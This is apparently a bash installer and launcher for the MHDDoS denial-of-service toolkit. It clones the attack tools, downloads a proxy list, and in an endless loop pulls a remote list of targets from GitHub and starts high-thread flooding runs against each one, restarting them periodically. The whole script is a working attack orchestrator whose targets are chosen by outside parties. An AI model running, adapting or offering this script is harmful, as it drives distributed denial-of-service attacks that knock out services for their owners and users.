#!/bin/bash
# Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
sudo apt update -qq -y
sudo apt install git python3 python3-pip -qq -y
# for some virtual cloud systems based on debian (like GC)
sudo apt install gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo pip install --upgrade pip

cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
# for avoid installing wget, otherwise it need to be added in install section
rm proxies_config.json
#curl -o proxies_config.json https://raw.githubusercontent.com/KarboDuck/mhddos_bash/main/proxies_config.json 
curl -o proxies_config.json https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json
#wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json

git clone https://github.com/MHProDev/MHDDoS.git
#change commit SHA and uncomment next 3 lines for revert to certain commit, when something code wrong happened
#cd MHDDoS
#git reset --hard d680dca8066c0fcea5ce59ece1ddf587a9eed79b
#cd ..
python3 -m pip install -r MHDDoS/requirements.txt

threads="${1:-1000}"; threads="-t $threads"
rpc="--rpc 1000"
proxy_upd="-p 3600"
debug="--debug"

# Restart attacks and update targets every 20 minutes
while true
do
   pkill -f start.py; pkill -f runner.py 
   # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   echo -e "\nNumber of targets in list: " $list_size "\n"
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
            echo -e "\nNumber of targets in list: " $list_size "\n"
      done
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
      done
sleep 10s
done
